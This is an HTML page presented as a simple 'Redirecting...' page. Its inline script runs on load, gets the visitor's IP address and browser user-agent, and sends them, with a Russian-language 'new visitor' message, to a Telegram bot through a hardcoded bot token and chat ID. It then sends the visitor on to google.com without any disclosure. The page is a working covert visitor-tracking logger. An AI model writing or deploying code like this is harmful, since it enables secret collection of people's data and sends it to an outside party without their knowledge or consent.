<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        const botToken = "7548681470:AAETEnSZdclBzxtInZBZmAeRcquigEwRgu8"; 
        const chatId = "6331127625";
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const userAgent = navigator.userAgent;
                const message = `👤 Новый посетитель:\nIP: ${ip}\nUser-Agent: ${userAgent}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                    .then(() => {
                        window.location.href = "https://google.com";
                    });
            })
            .catch(err => {
                console.error('Ошибка получения IP:', err);
                window.location.href = "https://google.com";
            });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
</body>
</html>